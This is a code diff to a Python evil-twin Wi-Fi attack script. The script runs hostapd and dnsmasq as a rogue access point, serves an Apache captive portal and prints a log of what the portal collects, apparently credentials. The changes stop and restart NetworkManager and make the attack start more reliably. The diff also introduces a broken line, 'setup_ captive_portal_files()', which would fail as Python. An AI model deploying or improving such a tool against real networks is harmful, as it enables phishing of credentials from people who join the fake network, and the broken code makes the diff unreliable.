@@ -60,6 +60,14 @@ def check_dependencies():
         sys.exit(1)
     print("[+] All dependencies are installed.")
 
+def manage_network_manager(action='stop'):
+    """Stops or starts the NetworkManager service."""
+    service_cmd = ['systemctl', action, 'NetworkManager']
+    print(f"[*] Attempting to {action} NetworkManager...")
+    # We don't treat failure here as critical, as it might not be running
+    run_command(service_cmd)
+    print(f"[+] NetworkManager {action} command issued.")
+
 def toggle_ip_forwarding(enable=True):
     """Enables or disables IP forwarding."""
     action = "Enabling" if enable else "Disabling"
@@ -287,8 +295,8 @@ def start_attack():
     global dnsmasq_proc, hostapd_proc
     print("[*] Starting the attack...")
     
-    # Ensure no other dnsmasq is running
-    run_command(['pkill', 'dnsmasq'])
+    # Ensure no other dnsmasq is running. Don't check for errors.
+    subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
     
     try:
@@ -297,16 +305,15 @@ def start_attack():
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         print("[*] Starting hostapd...")
-        # Note: hostapd can be noisy, so redirecting output is good.
         hostapd_proc = subprocess.Popen(['hostapd', 'hostapd.conf'], 
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         time.sleep(2) # Give processes a moment to start or fail
         
         if dnsmasq_proc.poll() is not None:
-            raise Exception("dnsmasq failed to start.")
+            raise Exception("dnsmasq failed to start. Check for conflicting services or configuration issues.")
         if hostapd_proc.poll() is not None:
-            raise Exception("hostapd failed to start.")
+            raise Exception("hostapd failed to start. Check if the wireless card supports AP mode.")
             
         print("\n[+] EVIL TWIN IS RUNNING!")
         print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
@@ -348,6 +355,9 @@ def cleanup(signum, frame):
     if script_args:
         print(f"[*] Flushing IP from {script_args.iface}...")
         run_command(['ip', 'addr', 'flush', 'dev', script_args.iface])
+    
+    # --- Restart NetworkManager ---
+    manage_network_manager(action='start')
 
     # --- Handle log file ---
     log_file = "/var/log/ca.log"
@@ -355,9 +365,13 @@ def cleanup(signum, frame):
         print(f"[*] Displaying contents of {log_file}:")
         try:
             with open(log_file, "r") as f:
-                print("-" * 40)
-                print(f.read().strip())
-                print("-" * 40)
+                content = f.read().strip()
+                if content:
+                    print("-" * 40)
+                    print(content)
+                    print("-" * 40)
+                else:
+                    print("[*] Log file is empty.")
         except Exception as e:
             print(f"[-] Could not read log file: {e}")
         
@@ -406,11 +420,14 @@ def main():
     # Register the cleanup function for SIGINT (Ctrl+C)
     signal.signal(signal.SIGINT, cleanup)
     
+    # Stop NetworkManager to prevent conflicts
+    manage_network_manager(action='stop')
+    
     ip_addr = configure_interface(script_args.iface, script_args.network)
     create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
     create_hostapd_conf(script_args.iface, script_args.ssid, script_args.channel)
     setup_apache()
-    setup_captive_portal_files()
+    setup_ captive_portal_files()
     setup_log_file()
     create_vhost()
     enable_apache_site()
